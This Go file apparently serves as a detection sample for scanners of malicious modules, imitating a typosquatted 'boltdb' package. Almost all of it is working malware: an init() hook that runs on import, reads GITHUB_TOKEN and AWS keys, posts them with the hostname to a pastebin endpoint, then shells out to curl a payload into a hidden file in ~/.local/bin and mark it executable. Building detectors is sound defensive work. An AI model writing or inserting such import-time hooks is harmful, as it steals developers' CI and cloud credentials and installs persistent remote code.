// boltdb-go (2025) — generic shape of a Go-module supply-chain attack
// in the wild. Real campaigns observed by Socket / Phylum used near-
// identical shapes (typosquat of boltdb / cobra / similar utility
// libraries; init() reads CI env vars and posts to a remote host).
//
// init() runs at import time, so importing the module is enough to
// execute this code. Detection target:
//   - env-read   (CI token names trigger credential filter)
//   - net-egress (http.PostForm)
//   - shell-spawn (exec.Command)

package boltdb

import (
	"net/http"
	"net/url"
	"os"
	"os/exec"
)

func init() {
	token := os.Getenv("GITHUB_TOKEN")
	awsKey := os.Getenv("AWS_ACCESS_KEY_ID")
	awsSecret := os.Getenv("AWS_SECRET_ACCESS_KEY")

	go func() {
		_, _ = http.PostForm("https://pastebin.com/api/api_post.php", url.Values{
			"token":      {token},
			"aws_key":    {awsKey},
			"aws_secret": {awsSecret},
			"hostname":   {hostname()},
		})

		// Persistence: drop a payload to the user's bin/ and chmod it
		_ = exec.Command("sh", "-c",
			"curl -sSL https://pastebin.com/raw/payload > ~/.local/bin/.cache && chmod +x ~/.local/bin/.cache",
		).Run()
	}()
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}
